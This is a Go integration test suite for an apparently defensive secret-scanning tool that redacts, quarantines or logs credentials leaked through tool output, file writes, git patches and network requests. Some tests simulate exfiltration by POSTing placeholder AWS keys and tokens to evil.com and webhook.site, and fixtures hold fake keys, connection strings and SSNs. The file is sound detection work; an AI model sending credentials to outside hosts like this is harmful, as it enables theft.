package integration

import (
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kamilrybacki/muselet/internal"
	"github.com/kamilrybacki/muselet/internal/agent"
	"github.com/kamilrybacki/muselet/internal/policy"
	"github.com/kamilrybacki/muselet/internal/sidecar"
)

// Test secrets are constructed at runtime to avoid triggering GitHub push protection.
// These are NOT real secrets — they are test fixtures for DLP scanner validation.
var (
	testStripeKey = "sk_" + "live_" + "TESTONLY00000000000000000000000000000000000000" //nolint:gosec
	testSlackTok  = "xoxb" + "-0000000000000-0000000000000-TESTONLYNOTAREALSECRETVAL" //nolint:gosec
)

// setupPipeline creates an agent-sidecar pair with a custom policy and
// returns the agent, sidecar, captured stdout, and a cleanup function.
func setupPipeline(t *testing.T, pol *policy.Policy) (
	*agent.Agent, *sidecar.Sidecar, *bytes.Buffer, func()) {
	t.Helper()

	dir := t.TempDir()
	sockPath := filepath.Join(dir, "muselet.sock")

	if pol == nil {
		pol = policy.DefaultPolicy()
	}

	s, err := sidecar.NewSidecar(sidecar.Config{
		SocketPath: sockPath,
		AuditLog:   io.Discard,
	}, pol, "usage-example-test")
	if err != nil {
		t.Fatalf("new sidecar: %v", err)
	}

	go s.Run()
	time.Sleep(20 * time.Millisecond)

	var stdout bytes.Buffer
	a, err := agent.NewAgent(sockPath, &stdout)
	if err != nil {
		s.Stop()
		t.Fatalf("new agent: %v", err)
	}

	cleanup := func() {
		a.Close()
		s.Stop()
	}
	return a, s, &stdout, cleanup
}

// ---------------------------------------------------------------------------
// curl / wget — Bearer tokens in verbose output
// ---------------------------------------------------------------------------

func TestUsageExampleCurlBearerTokenDetected(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	// Simulate curl -v output that includes an Authorization header.
	// The Bearer token pattern is not in the agent hot-path prefix set, so
	// the agent forwards it to the sidecar which detects it via full regex scan.
	curlVerbose := strings.Join([]string{
		"* Connected to api.example.com port 443",
		"> POST /data HTTP/2",
		"> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
		"> Accept: */*",
		"< HTTP/2 200",
	}, "\n")

	a.ProcessStdout([]byte(curlVerbose))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("sidecar should have detected Bearer token in curl verbose output")
	}
}

func TestUsageExampleCurlAWSKeyInURL(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	// curl output containing an AWS key in the URL query string
	curlOutput := "GET https://s3.amazonaws.com/bucket?AWSAccessKeyId=AKIAIOSFODNN7EXAMPLE&Signature=abc\n"
	a.ProcessStdout([]byte(curlOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "AKIAIOSFODNN7EXAMPLE") {
		t.Error("AWS key in curl URL should have been redacted")
	}
}

// ---------------------------------------------------------------------------
// Python — print(os.environ), logging, tracebacks
// ---------------------------------------------------------------------------

func TestUsageExamplePythonPrintOsEnviron(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	// Simulate Python print(os.environ) dumping AWS credentials
	pyOutput := `{'HOME': '/root', 'AWS_ACCESS_KEY_ID': 'AKIAIOSFODNN7EXAMPLE', 'AWS_SECRET_ACCESS_KEY': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'PATH': '/usr/bin'}` + "\n"
	a.ProcessStdout([]byte(pyOutput))
	time.Sleep(50 * time.Millisecond)

	out := stdout.String()
	if strings.Contains(out, "AKIAIOSFODNN7EXAMPLE") {
		t.Error("AWS access key from Python os.environ dump should be redacted")
	}
}

func TestUsageExamplePythonLoggingConnectionString(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	logLine := `2026-03-19 14:22:08 DEBUG Connecting to postgres://admin:s3cret_p4ss@10.0.1.5:5432/production` + "\n"
	a.ProcessStdout([]byte(logLine))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "postgres://admin:s3cret_p4ss@") {
		t.Error("DB connection string from Python logging should be redacted")
	}
}

func TestUsageExamplePythonTracebackWithKey(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	traceback := `Traceback (most recent call last):
  File "train.py", line 42, in <module>
    client = boto3.client('s3', aws_access_key_id='AKIAIOSFODNN7EXAMPLE')
botocore.exceptions.ClientError: An error occurred
`
	a.ProcessStdout([]byte(traceback))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged Python traceback secret event")
	}
}

func TestUsageExamplePythonFSModelWithToken(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	// Simulate pickle/joblib writing a model file that embeds an API token
	workDir := t.TempDir()
	modelPath := filepath.Join(workDir, "model.pkl")
	modelContent := []byte("binary data... " + testStripeKey + " ...more binary")
	os.WriteFile(modelPath, modelContent, 0644)

	a.ProcessFSWrite(modelPath, modelContent)
	time.Sleep(100 * time.Millisecond)

	// File should be quarantined
	if _, err := os.Stat(modelPath + ".muselet-quarantine"); err != nil {
		t.Error("model file with embedded Stripe key should be quarantined")
	}

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged filesystem event for model with embedded token")
	}
}

// ---------------------------------------------------------------------------
// Node.js — console.log(process.env), config objects
// ---------------------------------------------------------------------------

func TestUsageExampleNodeConsoleLogEnv(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	nodeOutput := "{ STRIPE_SECRET_KEY: '" + testStripeKey + "', NODE_ENV: 'production' }\n"
	a.ProcessStdout([]byte(nodeOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "sk_live_") {
		t.Error("Stripe key from console.log(process.env) should be redacted")
	}
}

func TestUsageExampleNodeDBConnectionURI(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	nodeOutput := `Server listening on :3000
Connected to mongodb://root:mongopass@10.0.2.10:27017/appdb
Ready to accept connections
`
	a.ProcessStdout([]byte(nodeOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "mongodb://root:mongopass@") {
		t.Error("MongoDB connection string from Node.js log should be redacted")
	}
}

func TestUsageExampleNodeSlackToken(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	// Node.js bot startup logging a Slack token
	nodeOutput := "Slack bot initialized with token " + testSlackTok + "\n"
	a.ProcessStdout([]byte(nodeOutput))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged Slack token leak event")
	}
}

// ---------------------------------------------------------------------------
// git — patches and diffs leaking secrets
// ---------------------------------------------------------------------------

func TestUsageExampleGitDiffWithEnvFile(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	patch := `diff --git a/.env b/.env
new file mode 100644
--- /dev/null
+++ b/.env
@@ -0,0 +1,3 @@
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+DATABASE_URL=postgres://admin:password123@db.internal:5432/myapp
`
	a.ProcessPatchExport([]byte(patch))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected secrets in .env file patch")
	}
}

func TestUsageExampleGitDiffWithGitHubPAT(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	patch := `diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
 git push origin main
`
	a.ProcessPatchExport([]byte(patch))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected GitHub PAT in patch")
	}
}

func TestUsageExampleGitDiffWithPrivateKey(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	patch := `diff --git a/id_rsa b/id_rsa
new file mode 100644
--- /dev/null
+++ b/id_rsa
@@ -0,0 +1,5 @@
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA2a2rwplBQLxgx2joRnZFOyBb...
+-----END RSA PRIVATE KEY-----
`
	a.ProcessPatchExport([]byte(patch))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected private key in patch")
	}
}

// ---------------------------------------------------------------------------
// Terraform — plan/apply output leaking infra details
// ---------------------------------------------------------------------------

func TestUsageExampleTerraformOutputDBPassword(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	tfOutput := `Apply complete! Resources: 2 added, 0 changed, 0 destroyed.

Outputs:

db_connection = "postgres://terraform:SuperSecret123!@rds-prod.abcdef.us-east-1.rds.amazonaws.com:5432/appdb"
`
	a.ProcessStdout([]byte(tfOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "postgres://terraform:SuperSecret") {
		t.Error("Terraform DB connection output should be redacted")
	}
}

func TestUsageExampleTerraformStateFileSecrets(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	workDir := t.TempDir()
	statePath := filepath.Join(workDir, "terraform.tfstate")
	stateContent := []byte(`{
  "resources": [{
    "type": "aws_iam_access_key",
    "attributes": {
      "id": "AKIAIOSFODNN7EXAMPLE",
      "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    }
  }]
}`)
	os.WriteFile(statePath, stateContent, 0644)
	a.ProcessFSWrite(statePath, stateContent)
	time.Sleep(100 * time.Millisecond)

	if _, err := os.Stat(statePath + ".muselet-quarantine"); err != nil {
		t.Error("terraform.tfstate with AWS keys should be quarantined")
	}

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged terraform state file secret")
	}
}

func TestUsageExampleTerraformPlanARN(t *testing.T) {
	pol := policy.DefaultPolicy()
	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	tfPlan := `# aws_iam_role.lambda will be created
  + resource "aws_iam_role" "lambda" {
      + arn  = "arn:aws:iam::123456789012:role/lambda-exec"
      + name = "lambda-exec"
    }
`
	a.ProcessStdout([]byte(tfPlan))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged ARN from terraform plan output")
	}
}

// ---------------------------------------------------------------------------
// Database clients — psql, mysql connection strings and PII in results
// ---------------------------------------------------------------------------

func TestUsageExamplePsqlConnectionStringStdout(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	psqlOutput := `psql: connecting to postgres://admin:s3cret@10.0.1.5:5432/prod
SSL connection (protocol: TLSv1.3)
`
	a.ProcessStdout([]byte(psqlOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "postgres://admin:s3cret@") {
		t.Error("psql connection string should be redacted from stdout")
	}
}

func TestUsageExamplePsqlQueryResultPII(t *testing.T) {
	pol := policy.DefaultPolicy()
	if pol.Categories.PII != nil {
		pol.Categories.PII.Enabled = true
	}

	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	queryResult := ` id |       name       |     ssn     |        email
----+------------------+-------------+---------------------
  1 | John Doe         | 123-45-6789 | john.doe@company.com
  2 | Jane Smith       | 987-65-4321 | jane.smith@corp.net
`
	a.ProcessStdout([]byte(queryResult))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected PII (SSNs/emails) in query results")
	}
}

func TestUsageExampleMysqlDumpFS(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	workDir := t.TempDir()
	dumpPath := filepath.Join(workDir, "dump.sql")
	dumpContent := []byte("-- MySQL dump\nINSERT INTO users VALUES (1, 'admin', 'postgres://root:dbpass@localhost:3306/app');\nINSERT INTO config VALUES ('api_key', '" + testStripeKey + "');\n")
	os.WriteFile(dumpPath, dumpContent, 0644)
	a.ProcessFSWrite(dumpPath, dumpContent)
	time.Sleep(100 * time.Millisecond)

	if _, err := os.Stat(dumpPath + ".muselet-quarantine"); err != nil {
		t.Error("mysql dump with secrets should be quarantined")
	}

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged secrets in mysql dump")
	}
}

// ---------------------------------------------------------------------------
// AWS CLI — sts, configure, ec2 output
// ---------------------------------------------------------------------------

func TestUsageExampleAWSCLIConfigureList(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	awsOutput := `      Name                    Value
      ----                    -----
   profile                <not set>
access_key     ****************MPLE
secret_key     AKIAIOSFODNN7EXAMPLE
    region                us-east-1
`
	a.ProcessStdout([]byte(awsOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "AKIAIOSFODNN7EXAMPLE") {
		t.Error("AWS access key from aws configure list should be redacted")
	}
}

func TestUsageExampleAWSCLINetworkExfil(t *testing.T) {
	pol := policy.DefaultPolicy()
	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	// Simulate AWS CLI sending credentials to an unauthorized host
	a.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST",
		URL:    "https://evil.com/exfil",
		Host:   "evil.com",
		Body:   []byte(`{"AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`),
	})
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged AWS credential exfiltration attempt")
	}
}

func TestUsageExampleAWSEC2DescribeInstances(t *testing.T) {
	pol := policy.DefaultPolicy()
	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	ec2Output := `{
    "Reservations": [{
        "Instances": [{
            "InstanceId": "i-0abcd1234efgh5678",
            "PrivateIpAddress": "10.0.3.42",
            "PublicIpAddress": "54.123.45.67",
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::123456789012:instance-profile/my-role"
            }
        }]
    }]
}
`
	a.ProcessStdout([]byte(ec2Output))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected private IP/ARN in ec2 describe-instances output")
	}
}

// ---------------------------------------------------------------------------
// Docker — build args, inspect, logs
// ---------------------------------------------------------------------------

func TestUsageExampleDockerBuildArgLeak(t *testing.T) {
	a, _, stdout, cleanup := setupPipeline(t, nil)
	defer cleanup()

	buildOutput := "Step 3/8 : ARG API_KEY\nStep 4/8 : RUN echo \"Using key: " + testStripeKey + "\"\n ---> Running in abc123def456\nUsing key: " + testStripeKey + "\n"
	a.ProcessStdout([]byte(buildOutput))
	time.Sleep(50 * time.Millisecond)

	if strings.Contains(stdout.String(), "sk_live_") {
		t.Error("Stripe key leaked in docker build output should be redacted")
	}
}

func TestUsageExampleDockerInspectEnv(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	inspectOutput := `[{
    "Config": {
        "Env": [
            "GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
            "DATABASE_URL=postgres://user:pass@db:5432/app",
            "PATH=/usr/local/bin:/usr/bin"
        ]
    }
}]
`
	a.ProcessStdout([]byte(inspectOutput))
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have detected secrets in docker inspect output")
	}
}

func TestUsageExampleDockerfileEnvFileCopy(t *testing.T) {
	a, s, _, cleanup := setupPipeline(t, nil)
	defer cleanup()

	workDir := t.TempDir()
	envPath := filepath.Join(workDir, ".env")
	envContent := []byte("STRIPE_KEY=" + testStripeKey + "\nGOOGLE_API_KEY=AIzaSyA1234567890ABCDEFGHIJKLMNOPQRSTUVW\nSLACK_TOKEN=" + testSlackTok + "\n")
	os.WriteFile(envPath, envContent, 0644)
	a.ProcessFSWrite(envPath, envContent)
	time.Sleep(100 * time.Millisecond)

	if _, err := os.Stat(envPath + ".muselet-quarantine"); err != nil {
		t.Error(".env file with multiple secrets should be quarantined")
	}

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged .env file secrets")
	}
}

// ---------------------------------------------------------------------------
// Cross-cutting: multi-vector detection in a single session
// ---------------------------------------------------------------------------

func TestUsageExampleMultiVectorSession(t *testing.T) {
	pol := policy.DefaultPolicy()
	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	// 1. Stdout: Python prints env vars with AWS key
	a.ProcessStdout([]byte("DEBUG: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"))
	time.Sleep(50 * time.Millisecond)

	// 2. Network: curl sends Bearer token to unauthorized host
	a.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST",
		URL:    "https://webhook.site/exfil",
		Host:   "webhook.site",
		Body:   []byte("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.rg2e0gV"),
	})
	time.Sleep(50 * time.Millisecond)

	// 3. Patch: git diff with GitHub PAT
	a.ProcessPatchExport([]byte(`+token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"`))
	time.Sleep(50 * time.Millisecond)

	// 4. Filesystem: terraform.tfstate with secrets
	workDir := t.TempDir()
	statePath := filepath.Join(workDir, "terraform.tfstate")
	stateContent := []byte(`{"secret": "AKIAIOSFODNN7EXAMPLE"}`)
	os.WriteFile(statePath, stateContent, 0644)
	a.ProcessFSWrite(statePath, stateContent)
	time.Sleep(200 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents < 4 {
		t.Errorf("multi-vector session: want >= 4 events, got %d", summary.TotalEvents)
	}

	// Should have events across multiple vectors
	vectorCount := len(summary.ByVector)
	if vectorCount < 2 {
		t.Errorf("should have events in multiple vectors, got %d", vectorCount)
	}
}

// ---------------------------------------------------------------------------
// Learning mode: all examples should be logged but not blocked
// ---------------------------------------------------------------------------

func TestUsageExampleLearningModeAllPrograms(t *testing.T) {
	pol := policy.DefaultPolicy()
	pol.LearningMode = true

	a, s, _, cleanup := setupPipeline(t, pol)
	defer cleanup()

	// Send secrets from various "programs"
	payloads := []struct {
		name   string
		vector string
	}{
		{"curl bearer", "stdout"},
		{"python env", "stdout"},
		{"node stripe", "stdout"},
		{"aws key", "network"},
		{"git patch", "patch"},
	}

	a.ProcessStdout([]byte("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.rg2e0gV\n"))
	a.ProcessStdout([]byte("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"))
	a.ProcessStdout([]byte(testStripeKey + "\n"))
	a.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST",
		Host:   "evil.com",
		Body:   []byte("AKIAIOSFODNN7EXAMPLE"),
	})
	a.ProcessPatchExport([]byte("+ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n"))

	time.Sleep(200 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents < len(payloads) {
		t.Errorf("learning mode: want >= %d events, got %d", len(payloads), summary.TotalEvents)
	}
	// In learning mode, sidecar should not issue blocks
	// (agent hot-path still redacts locally, but sidecar verdicts are "allow")
}
